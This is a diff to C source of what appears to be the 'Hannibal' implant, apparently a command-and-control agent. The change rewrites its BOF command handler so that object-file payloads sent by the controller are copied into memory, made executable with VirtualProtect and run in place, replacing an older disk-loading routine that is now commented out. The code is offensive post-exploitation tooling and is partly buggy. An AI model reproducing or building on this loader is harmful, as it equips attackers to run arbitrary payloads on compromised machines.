@@ -593,43 +593,44 @@ _END_OF_CODE:
 	return Success;
 }
 
-int do_bof(PINSTANCE hannibal_instance_ptr, CMD_EXECUTE_BOF bof_payload, char* task_uuid)
+int do_bof(BOF_IN* bof_payload)
 {
-	PSTR sPath = { 0 };
-	PBYTE pObject = { 0 };
-	ULONG uLength = { 0 };
+	// // Now bof doesn't work like this. change.
+	// PSTR sPath = { 0 };
+	// PBYTE pObject = { 0 };
+	// ULONG uLength = { 0 };
 
-	sPath = bof_payload.args;
-	WCHAR DbgString[256];
+	// sPath = bof_payload.args;
+	// WCHAR DbgString[256];
 	
-	// pic_strcpy(DbgString, "[*] Loading object file:");
-	// pic_strcat(DbgString, sPath);
-	// printf("[*] Loading object file: %s\n", sPath);
+	// // pic_strcpy(DbgString, "[*] Loading object file:");
+	// // pic_strcat(DbgString, sPath);
+	// // printf("[*] Loading object file: %s\n", sPath);
 	
-	pic_wsprintf(DbgString, L"[*] Loading object file: %s", sPath);
-	hannibal_response(DbgString, task_uuid);
+	// pic_wsprintf(DbgString, L"[*] Loading object file: %s", sPath);
+	// hannibal_response(DbgString, task_uuid);
 	
-	//
-	// read object file from disk into memory 
-	//
+	// //
+	// // read object file from disk into memory 
+	// //
 
-	if (!ReadFileFromDiskA(hannibal_instance_ptr, task_uuid, sPath, (PBYTE*)&pObject, &uLength)) {
-		// printf("[!] Failed to load file: %s\n", sPath);
-		hannibal_response(L"[!] Failed to load file", task_uuid);
-		goto END;
-	}
-	// printf("[*] Object file loaded @ %p [%ld bytes]\n", pObject, uLength);
-		pic_wsprintf(DbgString, L"[*] Object file loaded @ %p [%ld bytes]", pObject, uLength);
-		hannibal_response(DbgString, task_uuid);
-	//
-	// invoke the object file
-	//
+	// if (!ReadFileFromDiskA(hannibal_instance_ptr, task_uuid, sPath, (PBYTE*)&pObject, &uLength)) {
+	// 	// printf("[!] Failed to load file: %s\n", sPath);
+	// 	hannibal_response(L"[!] Failed to load file", task_uuid);
+	// 	goto END;
+	// }
+	// // printf("[*] Object file loaded @ %p [%ld bytes]\n", pObject, uLength);
+	// 	pic_wsprintf(DbgString, L"[*] Object file loaded @ %p [%ld bytes]", pObject, uLength);
+	// 	hannibal_response(DbgString, task_uuid);
+	// //
+	// // invoke the object file
+	// //
 
-	// TODOs: The `NULL` parameter is actually arguments. We need to pass the arguments to the object file correctly.
-	if (!ObjectLdr(hannibal_instance_ptr, task_uuid, pObject, "go", NULL, 0)) {
-		// printf("[!] Failed to execute object file\n");
-		hannibal_response(L"[!] Failed to execute object file", task_uuid);
-	}
+	// // TODOs: The `NULL` parameter is actually arguments. We need to pass the arguments to the object file correctly.
+	// if (!ObjectLdr(hannibal_instance_ptr, task_uuid, pObject, "go", NULL, 0)) {
+	// 	// printf("[!] Failed to execute object file\n");
+	// 	hannibal_response(L"[!] Failed to execute object file", task_uuid);
+	// }
 END:
 	return 0;
 }
@@ -638,17 +639,7 @@ SECTION_CODE void cmd_bof(TASK t)
 {
 	HANNIBAL_INSTANCE_PTR
 
-	CMD_EXECUTE_BOF *bof = (CMD_EXECUTE_BOF *)t.cmd;
-
-	/**
-    * Make sure this struct matches what's in the bof template.
-    */
-    typedef struct _BOF {
-        LPVOID args;
-		int arg_size;
-		PSTR path_bof;
-		int path_bof_size;
-    } BOF_IN;
+	CMD_EXECUTE_BOF *exec_bof = (CMD_EXECUTE_BOF *)t.cmd;
 
 	BOF_IN *bof_in_payload = (BOF_IN *)hannibal_instance_ptr->Win32.VirtualAlloc(
 		NULL,
@@ -656,16 +647,53 @@ SECTION_CODE void cmd_bof(TASK t)
 		MEM_COMMIT,
 		PAGE_READWRITE
 	);
+	
+	// bof payload size
+	size_t buffer_size = exec_bof->bof_size;
+	
+	// allocate memory for the bof content
+	UINT8 *bof_buff = *(UINT8 **)hannibal_instance_ptr->Win32.VirtualAlloc(
+		NULL,
+		buffer_size,
+		MEM_COMMIT,
+		PAGE_READWRITE
+	);
 
-	bof_in_payload->args = bof->args;
-	bof_in_payload->arg_size = bof->arg_size;
-	bof_in_payload->path_bof = hannibal_instance_ptr;
-	bof_in_payload->path_bof_size = t.task_uuid;
+	if (bof_buff != NULL) {
+		pic_memcpy(bof_buff, exec_bof->bof, buffer_size);
+	}
 
-	// TODO: Change `do_bof` function prototype
-	do_bof(hannibal_instance_ptr, bof_in_payload, t.task_uuid);
+	bof_in_payload->args = exec_bof->args;
+	bof_in_payload->arg_size = exec_bof->arg_size;
+	bof_in_payload->hannibal_instance = hannibal_instance_ptr;
+	bof_in_payload->controller_uuid = t.task_uuid;
+	bof_in_payload->pbof_content = bof_buff;
+	
+	// protect execute read 
 
-	// TODOs: doing some cleanup here
+	DWORD OldProtection = 0;
+	hannibal_instance_ptr->Win32.VirtualProtect(bof_buff, buffer_size, PAGE_EXECUTE_READ, &OldProtection);
+	
+	// real function
+	do_bof(bof_in_payload);
+
+	 // If you don't put a task response in the response queue, the uuid won't
+    // get freed and that is a leak. Either do it in there or here.
+
+    // TASK response_t;
+
+    // response_t.output = (LPCSTR)response_content;
+    // response_t.output_size = CURRENT_BUFFER_USAGE;
+    // response_t.task_uuid = t.task_uuid;
+
+    // task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);
+
+	hannibal_instance_ptr->Win32.VirtualFree(bof_in_payload, 0, MEM_RELEASE);
+	hannibal_instance_ptr->Win32.VirtualFree(bof_buff, 0, MEM_RELEASE);
+	hannibal_instance_ptr->Win32.VirtualFree(exec_bof->args, 0, MEM_RELEASE);
+	hannibal_instance_ptr->Win32.VirtualFree(exec_bof->bof, 0, MEM_RELEASE);
+	hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
+	// hannibal_instance_ptr->Win32.VirtualFree(t.task_uuid, 0, MEM_RELEASE); // Make sure your hbin sends a response so this gets freed in post_tasks
 }
 
 #endif
